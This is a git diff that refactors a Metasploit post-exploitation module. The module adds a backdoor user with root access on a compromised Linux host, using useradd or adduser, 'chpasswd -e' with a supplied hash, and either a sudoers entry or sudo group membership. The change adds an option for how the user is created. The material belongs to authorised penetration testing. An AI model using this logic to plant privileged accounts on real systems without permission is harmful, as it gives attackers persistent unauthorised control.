@@ -37,6 +37,7 @@ class MetasploitModule < Msf::Post
     ])
 
     register_advanced_options([
+      OptEnum.new('UseraddMethod', [true, 'Set how the module adds in new users and groups. AUTO will autodetect how to add new users, MANUAL will add users without any binaries, and CUSTOM will attempt to use a custom designated binary', 'AUTO', ['AUTO', 'MANUAL', 'CUSTOM']]),
       OptString.new('UseraddBinary', [false, 'Set binary used to set password if you dont want module to find it for you. Set this to \'MANUAL\' to run without binary', nil]),
       OptEnum.new('SudoMethod', [false, 'Set the method that the new user can obtain root. SUDO_FILE adds the user directly to sudoers while GROUP adds the new user to the sudo group', 'GROUP', ['SUDO_FILE', 'GROUP', 'NONE']]),
       OptEnum.new('MissingGroups', [true, 'Set how nonexisting groups are handled on the system. Either give an error in the module, ignore it and throw it out, or create the group on the system.', 'ERROR', ['ERROR', 'IGNORE', 'CREATE']]),
@@ -54,12 +55,11 @@ class MetasploitModule < Msf::Post
 
   def run
     fail_with(Failure::NoAccess, 'Session isnt running as root') unless is_root?
-    unless datastore['UseraddBinary'] == 'MANUAL'
-      if datastore['UseraddBinary']
-        fail_with(Failure::NotFound, "Cannot find command on path given: #{datastore['UseraddBinary']}") unless command_exists?(datastore['UseraddBinary'])
-      else
-        fail_with(Failure::NotVulnerable, 'Cannot find a means to add a new user') unless command_exists?('useradd') || command_exists?('adduser')
-      end
+    case datastore['UseraddMethod']
+    when 'CUSTOM'
+      fail_with(Failure::NotFound, "Cannot find command on path given: #{datastore['UseraddBinary']}") unless command_exists?(datastore['UseraddBinary'])
+    when 'AUTO'
+      fail_with(Failure::NotVulnerable, 'Cannot find a means to add a new user') unless command_exists?('useradd') || command_exists?('adduser')
     end
     fail_with(Failure::NotVulnerable, 'Cannot add user to sudo as sudoers doesnt exist') unless datastore['SudoMethod'] != 'SUDO_FILE' || file_exist?('/etc/sudoers')
     fail_with(Failure::NotFound, 'Shell specified does not exist on system') unless command_exists?(datastore['SHELL'])
@@ -92,14 +92,20 @@ class MetasploitModule < Msf::Post
     groups_handled = groups.empty?
 
     # Check database to see what OS it is. If it meets specific requirements, This can all be done in a single line
-    binary =
-      if datastore['UseraddBinary']
-        datastore['UseraddBinary']
-      elsif command_exists?('useradd')
-        'useradd'
-      elsif command_exists?('adduser')
-        'adduser'
-      end
+    binary = case datastore['UseraddMethod']
+             when 'AUTO'
+               if command_exists?('useradd')
+                 'useradd'
+               elsif command_exists?('adduser')
+                 'adduser'
+               else
+                 'MANUAL'
+               end
+             when 'MANUAL'
+               'MANUAL'
+             when 'CUSTOM'
+               datastore['UseraddBinary']
+             end
     os_platform =
       if session.type == 'meterpreter'
         sysinfo['OS']
@@ -193,7 +199,7 @@ class MetasploitModule < Msf::Post
         d_cmd_exec("#{binary} #{datastore['USERNAME']}")
         d_cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e")
       end
-    when binary != 'MANUAL' ? datastore['UseraddBinary'] : ''
+    when datastore['UseraddBinary']
       print_status('Running with command supplied')
       d_cmd_exec("#{binary} #{datastore['USERNAME']}")
       d_cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e")
